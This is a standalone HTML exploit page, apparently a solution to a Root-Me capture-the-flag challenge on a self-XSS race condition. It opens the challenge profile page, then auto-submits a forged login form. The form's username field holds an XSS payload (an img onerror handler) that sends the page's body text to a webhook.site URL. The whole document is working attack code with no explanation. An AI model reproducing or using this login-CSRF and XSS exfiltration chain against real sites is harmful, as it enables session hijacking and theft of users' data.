<!DOCTYPE html>
<html>
<body>

<h3>exploit running...</h3>

<script>
window.open(
  "https://www.root-me.org/en/Challenges/Web-Client/Self-XSS-Race-Condition/profile",
  "p"
);

setTimeout(() => {

  let f = document.createElement("form");
  f.method = "POST";
  f.action = "https://www.root-me.org/en/Challenges/Web-Client/Self-XSS-Race-Condition/login";

  let u = document.createElement("input");
  u.name = "username";

  u.value = `<img src=x onerror="
    fetch('https://webhook.site/78b00951-69fe-49c7-835f-8f12e8890a6f?secret=' +
    encodeURIComponent(document.body.innerText))
  ">`;

  f.appendChild(u);
  document.body.appendChild(f);
  f.submit();

}, 20);
</script>

</body>
</html>

